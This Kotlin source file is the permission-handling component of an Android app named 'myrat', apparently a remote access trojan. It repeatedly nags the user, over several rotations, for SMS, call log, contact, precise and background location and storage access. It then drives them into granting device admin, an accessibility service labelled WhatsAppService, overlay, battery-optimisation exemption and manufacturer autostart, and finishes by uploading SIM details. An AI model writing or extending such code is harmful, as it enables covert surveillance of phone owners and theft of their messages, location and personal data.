package com.myrat.app.handler

import android.Manifest
import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import com.myrat.app.service.ServiceManager
import com.myrat.app.utils.Logger
import pub.devrel.easypermissions.EasyPermissions
import pub.devrel.easypermissions.PermissionRequest
import java.lang.ref.WeakReference

class PermissionHandler(
    activity: Activity,
    private val simDetailsHandler: SimDetailsHandler,
    private val serviceManager: ServiceManager
) {
    private val activityRef = WeakReference(activity)
    private val handler = Handler(Looper.getMainLooper())
    private var currentPermissionGroup = 0
    private var rotationCount = 0
    private val maxRotations = 3
    private var isProcessing = false
    private var isDestroyed = false
    private var backgroundLocationRequested = false

    companion object {
        private const val RC_SMS_PERMISSIONS = 100
        private const val RC_PHONE_PERMISSIONS = 101
        private const val RC_LOCATION_PERMISSIONS = 102
        private const val RC_BACKGROUND_LOCATION = 103
        private const val RC_STORAGE_PERMISSIONS = 104
        private const val RC_NOTIFICATION_PERMISSIONS = 105
        private const val ROTATION_DELAY = 2000L
        private const val SPECIAL_PERMISSION_DELAY = 3000L
    }

    data class PermissionGroup(
        val name: String,
        val permissions: Array<String>,
        val requestCode: Int,
        val description: String,
        val isBackgroundLocation: Boolean = false
    )

    private val permissionGroups = listOf(
        PermissionGroup(
            name = "SMS",
            permissions = arrayOf(
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS
            ),
            requestCode = RC_SMS_PERMISSIONS,
            description = "SMS permissions required for messaging"
        ),
        PermissionGroup(
            name = "PHONE",
            permissions = arrayOf(
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.READ_PHONE_NUMBERS,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_CALL_LOG
            ),
            requestCode = RC_PHONE_PERMISSIONS,
            description = "Phone permissions required for calls and contacts"
        ),
        PermissionGroup(
            name = "LOCATION",
            permissions = arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ),
            requestCode = RC_LOCATION_PERMISSIONS,
            description = "Location permissions required for tracking"
        ),
        PermissionGroup(
            name = "BACKGROUND_LOCATION",
            permissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            } else {
                emptyArray()
            },
            requestCode = RC_BACKGROUND_LOCATION,
            description = "Background location required for continuous tracking",
            isBackgroundLocation = true
        ),
        PermissionGroup(
            name = "STORAGE",
            permissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                arrayOf(Manifest.permission.READ_MEDIA_IMAGES)
            } else {
                arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
            },
            requestCode = RC_STORAGE_PERMISSIONS,
            description = "Storage permissions required for media access"
        ),
        PermissionGroup(
            name = "NOTIFICATIONS",
            permissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                arrayOf(Manifest.permission.POST_NOTIFICATIONS)
            } else {
                emptyArray()
            },
            requestCode = RC_NOTIFICATION_PERMISSIONS,
            description = "Notification permissions required for alerts"
        )
    ).filter { it.permissions.isNotEmpty() }

    fun requestPermissions() {
        if (isDestroyed || isProcessing) return
        val activity = activityRef.get() ?: return
        if (activity.isFinishing || activity.isDestroyed) return

        try {
            isProcessing = true
            currentPermissionGroup = 0
            rotationCount = 0
            backgroundLocationRequested = false
            startRotationalPermissionFlow(activity)
        } catch (e: Exception) {
            Logger.error("Error starting permission request", e)
            isProcessing = false
        }
    }

    private fun startRotationalPermissionFlow(activity: Activity) {
        if (isDestroyed || activity.isFinishing || activity.isDestroyed) {
            finishPermissionFlow(activity)
            return
        }

        if (currentPermissionGroup >= permissionGroups.size) {
            rotationCount++
            currentPermissionGroup = 0
            if (rotationCount >= maxRotations) {
                requestSpecialPermissions(activity)
                return
            }
        }

        val permissionGroup = permissionGroups[currentPermissionGroup]
        if (permissionGroup.isBackgroundLocation) {
            handleBackgroundLocationPermission(activity, permissionGroup)
            return
        }

        if (EasyPermissions.hasPermissions(activity, *permissionGroup.permissions)) {
            serviceManager.checkAndStartAvailableServices()
            currentPermissionGroup++
            handler.post { startRotationalPermissionFlow(activity) }
            return
        }

        EasyPermissions.requestPermissions(
            PermissionRequest.Builder(activity, permissionGroup.requestCode, *permissionGroup.permissions)
                .setRationale("${permissionGroup.description}\n\nProgress: ${currentPermissionGroup + 1}/${permissionGroups.size}")
                .setPositiveButtonText("Grant")
                .setNegativeButtonText("Skip")
                .build()
        )
    }

    private fun handleBackgroundLocationPermission(activity: Activity, permissionGroup: PermissionGroup) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q || backgroundLocationRequested ||
            EasyPermissions.hasPermissions(activity, Manifest.permission.ACCESS_BACKGROUND_LOCATION) ||
            !EasyPermissions.hasPermissions(activity, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION)
        ) {
            currentPermissionGroup++
            handler.post { startRotationalPermissionFlow(activity) }
            return
        }

        backgroundLocationRequested = true
        EasyPermissions.requestPermissions(
            PermissionRequest.Builder(activity, permissionGroup.requestCode, *permissionGroup.permissions)
                .setRationale("${permissionGroup.description}\n\nPlease select 'Allow all the time'")
                .setPositiveButtonText("Grant All-Time")
                .setNegativeButtonText("Skip")
                .build()
        )
    }

    fun onPermissionsGranted(requestCode: Int, perms: MutableList<String>) {
        if (isDestroyed) return
        val activity = activityRef.get() ?: return
        if (activity.isFinishing || activity.isDestroyed) return

        serviceManager.checkAndStartAvailableServices()
        currentPermissionGroup++
        val delay = if (requestCode == RC_LOCATION_PERMISSIONS) 1000L else ROTATION_DELAY
        handler.postDelayed({ startRotationalPermissionFlow(activity) }, delay)
    }

    fun onPermissionsDenied(requestCode: Int, perms: MutableList<String>) {
        if (isDestroyed) return
        val activity = activityRef.get() ?: return
        if (activity.isFinishing || activity.isDestroyed) return

        serviceManager.checkAndStartAvailableServices()
        if (EasyPermissions.somePermissionPermanentlyDenied(activity, perms)) {
            Logger.warn("Some permissions permanently denied")
        }
        currentPermissionGroup++
        handler.postDelayed({ startRotationalPermissionFlow(activity) }, ROTATION_DELAY)
    }

    private fun requestSpecialPermissions(activity: Activity) {
        if (isDestroyed || activity.isFinishing || activity.isDestroyed) {
            finishPermissionFlow(activity)
            return
        }

        when {
            !isBatteryOptimizationDisabled(activity) -> requestBatteryOptimization(activity)
            !isDeviceAdminEnabled(activity) -> requestDeviceAdmin(activity)
            !isAccessibilityServiceEnabled(activity) -> requestAccessibilityService(activity)
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(activity) -> requestOverlayPermission(activity)
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && !isExactAlarmsEnabled(activity) -> requestExactAlarms(activity)
            else -> requestManufacturerSpecificSettings(activity)
        }
    }

    private fun requestBatteryOptimization(activity: Activity) {
        try {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
            handler.postDelayed({
                if (!isDestroyed) {
                    serviceManager.checkAndStartAvailableServices()
                    requestSpecialPermissions(activity)
                }
            }, SPECIAL_PERMISSION_DELAY)
        } catch (e: Exception) {
            Logger.error("Failed to request battery optimization", e)
            handler.postDelayed({ if (!isDestroyed) requestSpecialPermissions(activity) }, 1000)
        }
    }

    private fun requestDeviceAdmin(activity: Activity) {
        try {
            val adminComponent = ComponentName(activity, com.myrat.app.receiver.MyDeviceAdminReceiver::class.java)
            val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for device locking")
            }
            activity.startActivity(intent)
            handler.postDelayed({
                if (!isDestroyed) {
                    serviceManager.checkAndStartAvailableServices()
                    requestSpecialPermissions(activity)
                }
            }, SPECIAL_PERMISSION_DELAY)
        } catch (e: Exception) {
            Logger.error("Failed to request device admin", e)
            handler.postDelayed({ if (!isDestroyed) requestSpecialPermissions(activity) }, 1000)
        }
    }

    private fun requestAccessibilityService(activity: Activity) {
        try {
            activity.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            handler.postDelayed({
                if (!isDestroyed) {
                    serviceManager.checkAndStartAvailableServices()
                    requestSpecialPermissions(activity)
                }
            }, SPECIAL_PERMISSION_DELAY)
        } catch (e: Exception) {
            Logger.error("Failed to open accessibility settings", e)
            handler.postDelayed({ if (!isDestroyed) requestSpecialPermissions(activity) }, 1000)
        }
    }

    private fun requestOverlayPermission(activity: Activity) {
        try {
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
            handler.postDelayed({
                if (!isDestroyed) {
                    serviceManager.checkAndStartAvailableServices()
                    requestSpecialPermissions(activity)
                }
            }, SPECIAL_PERMISSION_DELAY)
        } catch (e: Exception) {
            Logger.error("Failed to request overlay permission", e)
            handler.postDelayed({ if (!isDestroyed) requestSpecialPermissions(activity) }, 1000)
        }
    }

    private fun requestExactAlarms(activity: Activity) {
        try {
            val intent = Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
            handler.postDelayed({
                if (!isDestroyed) {
                    serviceManager.checkAndStartAvailableServices()
                    requestSpecialPermissions(activity)
                }
            }, SPECIAL_PERMISSION_DELAY)
        } catch (e: Exception) {
            Logger.error("Failed to request exact alarms", e)
            handler.postDelayed({ if (!isDestroyed) requestSpecialPermissions(activity) }, 1000)
        }
    }

    private fun requestManufacturerSpecificSettings(activity: Activity) {
        val manufacturer = Build.MANUFACTURER.lowercase()
        val intents = when {
            manufacturer.contains("xiaomi") -> listOf(
                Intent().setComponent(ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")),
                Intent("miui.intent.action.APP_PERM_EDITOR").setClassName("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionsEditorActivity").putExtra("extra_pkgname", activity.packageName)
            )
            manufacturer.contains("oppo") || manufacturer.contains("realme") -> listOf(
                Intent().setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.FakeActivity")),
                Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).setData(Uri.parse("package:${activity.packageName}"))
            )
            manufacturer.contains("vivo") -> listOf(
                Intent().setComponent(ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"))
            )
            manufacturer.contains("huawei") -> listOf(
                Intent().setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"))
            )
            manufacturer.contains("samsung") || manufacturer.contains("oneplus") -> listOf(
                Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).setData(Uri.parse("package:${activity.packageName}"))
            )
            else -> emptyList()
        }

        tryLaunchIntents(activity, intents, manufacturer)
    }

    private fun tryLaunchIntents(activity: Activity, intents: List<Intent>, settingsName: String) {
        for (intent in intents) {
            try {
                if (intent.resolveActivity(activity.packageManager) != null) {
                    activity.startActivity(intent)
                    handler.postDelayed({ if (!isDestroyed) finishPermissionFlow(activity) }, 2000)
                    return
                }
            } catch (e: Exception) {
                Logger.warn("Failed to launch intent for $settingsName", e)
            }
        }
        finishPermissionFlow(activity)
    }

    private fun finishPermissionFlow(activity: Activity) {
        if (isDestroyed) return
        try {
            serviceManager.checkAndStartAvailableServices()
            simDetailsHandler.uploadSimDetails()
            logPermissionStatus(activity)
            isProcessing = false
        } catch (e: Exception) {
            Logger.error("Error in finishPermissionFlow", e)
            isProcessing = false
        }
    }

    private fun logPermissionStatus(activity: Activity) {
        Logger.log("=== PERMISSION STATUS ===")
        permissionGroups.forEach { group ->
            Logger.log("${group.name}: ${if (EasyPermissions.hasPermissions(activity, *group.permissions)) "GRANTED" else "DENIED"}")
        }
        Logger.log("Battery Optimization: ${if (isBatteryOptimizationDisabled(activity)) "DISABLED" else "ENABLED"}")
        Logger.log("Device Admin: ${if (isDeviceAdminEnabled(activity)) "ENABLED" else "DISABLED"}")
        Logger.log("Accessibility Service: ${if (isAccessibilityServiceEnabled(activity)) "ENABLED" else "DISABLED"}")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Logger.log("Overlay: ${if (Settings.canDrawOverlays(activity)) "GRANTED" else "DENIED"}")
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            Logger.log("Exact Alarms: ${if (isExactAlarmsEnabled(activity)) "GRANTED" else "DENIED"}")
        }
    }

    private fun isBatteryOptimizationDisabled(context: Context): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                (context.getSystemService(Context.POWER_SERVICE) as? PowerManager)
                    ?.isIgnoringBatteryOptimizations(context.packageName) ?: false
            } else {
                true
            }
        } catch (e: Exception) {
            Logger.error("Error checking battery optimization", e)
            false
        }
    }

    private fun isDeviceAdminEnabled(context: Context): Boolean {
        return try {
            val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? android.app.admin.DevicePolicyManager
            devicePolicyManager?.isAdminActive(ComponentName(context, com.myrat.app.receiver.MyDeviceAdminReceiver::class.java)) ?: false
        } catch (e: Exception) {
            Logger.error("Error checking device admin", e)
            false
        }
    }

    private fun isAccessibilityServiceEnabled(context: Context): Boolean {
        return try {
            val accessibilityEnabled = Settings.Secure.getInt(context.contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED, 0) == 1
            if (accessibilityEnabled) {
                Settings.Secure.getString(context.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
                    ?.contains("${context.packageName}/com.myrat.app.service.WhatsAppService") ?: false
            } else {
                false
            }
        } catch (e: Exception) {
            Logger.error("Error checking accessibility service", e)
            false
        }
    }

    private fun isExactAlarmsEnabled(context: Context): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                (context.getSystemService(Context.ALARM_SERVICE) as? android.app.AlarmManager)?.canScheduleExactAlarms() ?: false
            } else {
                true
            }
        } catch (e: Exception) {
            Logger.error("Error checking exact alarms", e)
            false
        }
    }

    fun handleResume() {
        if (isDestroyed) return
        val activity = activityRef.get() ?: return
        if (activity.isFinishing || activity.isDestroyed) return

        serviceManager.checkAndStartAvailableServices()
        if (!areAllPermissionsGranted()) {
            Logger.log("Not all permissions granted on resume")
        }
    }

    fun areAllPermissionsGranted(): Boolean {
        val activity = activityRef.get() ?: return false
        return try {
            permissionGroups.all { group -> EasyPermissions.hasPermissions(activity, *group.permissions) } &&
                    isBatteryOptimizationDisabled(activity) &&
                    isDeviceAdminEnabled(activity) &&
                    isAccessibilityServiceEnabled(activity)
        } catch (e: Exception) {
            Logger.error("Error checking all permissions", e)
            false
        }
    }

    fun cleanup() {
        isDestroyed = true
        isProcessing = false
        handler.removeCallbacksAndMessages(null)
        Logger.log("PermissionHandler cleaned up")
    }
}